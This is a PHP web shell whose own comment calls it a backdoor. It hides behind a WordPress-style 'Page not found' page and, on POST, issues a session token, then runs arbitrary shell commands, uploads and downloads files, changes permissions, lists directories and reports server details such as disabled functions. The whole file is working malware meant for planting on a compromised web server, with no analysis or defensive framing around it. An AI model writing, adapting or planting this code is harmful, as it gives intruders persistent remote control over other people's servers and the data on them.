<?php
// Enhanced PHP Backdoor with file operations and chmod
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><head><title>WordPress Style</title></head><body><h1>Page not found</h1></body></html>';
    exit;
}

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$session_key = 'wp_' . md5(__FILE__);
if (!isset($_SESSION[$session_key])) {
    $_SESSION[$session_key] = [
        'dir' => getcwd(),
        'token' => md5(uniqid() . $_SERVER['HTTP_HOST'] ?? '')
    ];
}

$auth_valid = false;
if (isset($_POST['k']) && $_POST['k'] === $_SESSION[$session_key]['token']) {
    $auth_valid = true;
}

if (!isset($_POST['cmd']) && !isset($_POST['k'])) {
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'ready',
        'dir' => $_SESSION[$session_key]['dir'],
        'token' => $_SESSION[$session_key]['token']
    ]);
    exit;
}

if (!$auth_valid && isset($_POST['cmd'])) {
    header('HTTP/1.1 403 Forbidden');
    echo 'Access Denied';
    exit;
}

$current_dir = $_SESSION[$session_key]['dir'];

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    
    if (!chdir($current_dir)) {
        echo json_encode(['status' => 'error', 'message' => 'Directory access failed']);
        exit;
    }

    switch ($cmd) {
        case 'cd':
            $path = $_POST['path'] ?? '';
            handle_cd($path, $session_key);
            break;
        case 'upload':
            handle_upload($session_key);
            break;
        case 'download':
            handle_download();
            break;
        case 'info':
            handle_info();
            break;
        case 'chmod':
            $file_path = $_POST['file_path'] ?? '';
            $mode = $_POST['mode'] ?? '';
            handle_chmod($file_path, $mode);
            break;
        case 'list_files':
            handle_list_files();
            break;
        default:
            handle_command($cmd, $session_key);
    }
}

function handle_cd($path, $session_key) {
    $current_dir = $_SESSION[$session_key]['dir'];
    
    if (empty($path)) {
        echo json_encode(['status' => 'error', 'message' => 'No path provided']);
        return;
    }

    $path = str_replace('\\', '/', trim($path));
    
    if ($path === '..') {
        $new_path = dirname($current_dir);
    } elseif ($path === '.') {
        $new_path = $current_dir;
    } else {
        $new_path = $path[0] === '/' ? $path : $current_dir . '/' . $path;
    }

    $real_path = realpath($new_path);
    
    if ($real_path && is_dir($real_path) && is_readable($real_path)) {
        chdir($real_path);
        $_SESSION[$session_key]['dir'] = getcwd();
        echo json_encode([
            'status' => 'success', 
            'dir' => $_SESSION[$session_key]['dir']
        ]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Invalid directory: ' . $path]);
    }
}

function handle_upload($session_key) {
    if (!isset($_FILES['f'])) {
        echo json_encode(['status' => 'error', 'message' => 'No file uploaded']);
        return;
    }

    $file = $_FILES['f'];
    $target = $_POST['t'] ?? $file['name'];
    
    // Ensure we're in the correct directory
    chdir($_SESSION[$session_key]['dir']);
    
    if (move_uploaded_file($file['tmp_name'], $target)) {
        echo json_encode(['status' => 'success', 'message' => 'Uploaded: ' . $target]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Upload failed']);
    }
}

function handle_download() {
    $file = $_POST['f'] ?? '';
    
    if (empty($file)) {
        header('HTTP/1.1 400 Bad Request');
        echo 'No file specified';
        exit;
    }
    
    // Ensure path is within current directory for security
    $current_dir = $_POST['current_dir'] ?? getcwd();
    $real_file = realpath($file);
    $real_current = realpath($current_dir);
    
    if (!$real_file || strpos($real_file, $real_current) !== 0) {
        header('HTTP/1.1 403 Forbidden');
        echo 'Access denied to file outside current directory';
        exit;
    }
    
    if (!file_exists($real_file) || !is_readable($real_file)) {
        header('HTTP/1.1 404 Not Found');
        echo 'File not found or not readable';
        exit;
    }

    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Length: ' . filesize($real_file));
    readfile($real_file);
    exit;
}

function handle_chmod($file_path, $mode) {
    if (empty($file_path) || empty($mode)) {
        echo json_encode(['status' => 'error', 'message' => 'File path and mode are required']);
        return;
    }
    
    // Convert mode to octal
    $mode_octal = octdec($mode);
    
    if (chmod($file_path, $mode_octal)) {
        echo json_encode(['status' => 'success', 'message' => "Permissions changed to $mode"]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to change permissions']);
    }
}

function handle_list_files() {
    $current_dir = getcwd();
    $files = [];
    
    if ($handle = opendir($current_dir)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                $full_path = $current_dir . '/' . $entry;
                $files[] = [
                    'name' => $entry,
                    'type' => is_dir($full_path) ? 'directory' : 'file',
                    'size' => is_file($full_path) ? filesize($full_path) : 0,
                    'permissions' => substr(sprintf('%o', fileperms($full_path)), -4),
                    'readable' => is_readable($full_path),
                    'writable' => is_writable($full_path)
                ];
            }
        }
        closedir($handle);
    }
    
    echo json_encode(['status' => 'success', 'files' => $files, 'current_dir' => $current_dir]);
}

function handle_info() {
    $info = [
        'php' => PHP_VERSION,
        'os' => PHP_OS,
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
        'user' => function_exists('get_current_user') ? get_current_user() : 'N/A',
        'cwd' => getcwd(),
        'disabled' => ini_get('disable_functions') ?: 'None'
    ];
    
    echo json_encode(['status' => 'success', 'info' => $info]);
}

function handle_command($cmd, $session_key) {
    $is_win = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    
    $_SESSION[$session_key]['dir'] = getcwd();
    
    if ($is_win) {
        $output = shell_exec("cmd /c " . escapeshellarg($cmd) . " 2>&1");
    } else {
        $output = shell_exec("$cmd 2>&1");
    }
    
    echo json_encode([
        'status' => 'success',
        'output' => $output ?: 'No output',
        'dir' => $_SESSION[$session_key]['dir']
    ]);
}
?>
